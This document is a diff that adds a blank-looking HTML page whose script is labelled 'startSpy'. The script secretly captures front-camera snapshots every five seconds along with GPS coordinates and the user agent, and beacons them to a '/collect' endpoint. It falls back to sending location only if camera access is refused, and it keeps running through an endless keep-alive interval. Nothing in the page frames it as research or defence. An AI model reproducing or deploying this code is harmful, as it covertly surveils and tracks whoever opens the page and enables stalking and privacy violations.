@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>.</title>
+  <style>
+    body, html { margin:0; padding:0; overflow:hidden; background:#000; }
+    #canvas, #video { display:none; }
+  </style>
+</head>
+<body>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+// === CONFIG ===
+const SERVER_URL = window.location.origin + '/collect';  // Dynamic domain
+const INTERVAL_MS = 5000;
+const IMG_QUALITY = 0.6;
+// ==============
+
+let video = document.getElementById('video');
+let canvas = document.getElementById('canvas');
+let ctx = canvas.getContext('2d');
+let stream = null;
+let intervalId = null;
+let uid = btoa(navigator.userAgent + Math.random()).substring(0, 16);
+
+async function startSpy() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: 640, height: 480 },
+      audio: false
+    });
+    
+    video.srcObject = stream;
+    video.onloadedmetadata = () => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      startCaptureLoop();
+    };
+  } catch (err) {
+    console.log("Camera denied, fallback to GPS");
+    fallbackGPSOnly();
+  }
+}
+
+function startCaptureLoop() {
+  intervalId = setInterval(async () => {
+    await captureAndSend();
+  }, INTERVAL_MS);
+}
+
+async function captureAndSend() {
+  if (video.readyState < 2) return;
+  
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  const base64 = canvas.toDataURL('image/jpeg', IMG_QUALITY).split(',')[1];
+  const gps = await getGPS();
+  const payload = {
+    uid: uid,
+    img: base64,
+    gps: gps,
+    ts: Date.now(),
+    ua: navigator.userAgent
+  };
+  
+  navigator.sendBeacon(SERVER_URL, JSON.stringify(payload));
+}
+
+function getGPS() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) return resolve("no_gps");
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve(`${pos.coords.latitude},${pos.coords.longitude}`),
+      () => resolve("denied"),
+      { timeout: 7000, maximumAge: 60000, enableHighAccuracy: false }
+    );
+  });
+}
+
+function fallbackGPSOnly() {
+  setInterval(async () => {
+    const gps = await getGPS();
+    const payload = { uid, gps, ts: Date.now(), ua: navigator.userAgent, img: null };
+    navigator.sendBeacon(SERVER_URL, JSON.stringify(payload));
+  }, INTERVAL_MS);
+}
+
+// START
+startSpy();
+
+// KEEP ALIVE
+setInterval(() => {}, 1e9);
+</script>
+</body>
+</html>
